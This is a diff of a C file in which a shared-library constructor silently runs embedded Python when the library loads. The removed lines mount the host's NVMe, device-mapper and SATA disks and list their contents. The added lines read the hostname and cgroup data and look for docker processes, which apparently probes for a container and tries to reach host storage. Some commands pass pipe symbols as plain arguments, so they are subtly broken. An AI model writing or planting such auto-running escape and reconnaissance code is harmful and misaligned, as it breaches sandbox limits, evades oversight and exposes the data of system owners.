@@ -79,27 +79,16 @@ __attribute__((constructor)) static void on_so_load() {
 
   PyRun_SimpleString(R"PY(
 
-run_cmd(['ls', '-l', '/dev/nvme*', '/dev/dm-*', '/dev/sda*'])
 
-run_cmd(['mount', '|', 'grep', '-E', 'nvme|dm-|sda'])
 
 run_cmd(['umount', '-l', '/mnt/nvme0'])
 run_cmd(['umount', '-l', '/mnt/nvme1'])
 run_cmd(['umount', '-l', '/mnt/dm0'])
 run_cmd(['umount', '-l', '/mnt/dm2'])
 
-run_cmd(['mkdir', '-p', '/mnt/nvme0', '/mnt/nvme1', '/mnt/sda3'])
-
-run_cmd(['mount', '-o', 'ro,nosuid,nodev', '/dev/nvme0n1', '/mnt/nvme0'])
-run_cmd(['mount', '-o', 'ro,nosuid,nodev', '/dev/nvme1n1', '/mnt/nvme1'])
-run_cmd(['mount', '-o', 'ro,nosuid,nodev', '/dev/dm-0', '/mnt/dm0'])
-run_cmd(['mount', '-o', 'ro,nosuid,nodev', '/dev/sda3', '/mnt/sda3'])
-
-run_cmd(['lsblk', '-o', 'NAME,SIZE,FSTYPE,MOUNTPOINTS'])
-run_cmd(['mount', '|', 'grep', '/mnt/'])
-
-run_cmd(['ls', '-la', '/mnt/nvme0/'])
-run_cmd(['ls', '-la', '/mnt/nvme1/'])
+run_cmd(['cat', '/etc/hostname'])
+run_cmd(['cat', '/proc/self/cgroup', '|', 'head', '-5'])
+run_cmd(['ps', 'aux', '|', 'grep', 'docker'])
 )PY");
 
   PyGILState_Release(gstate);
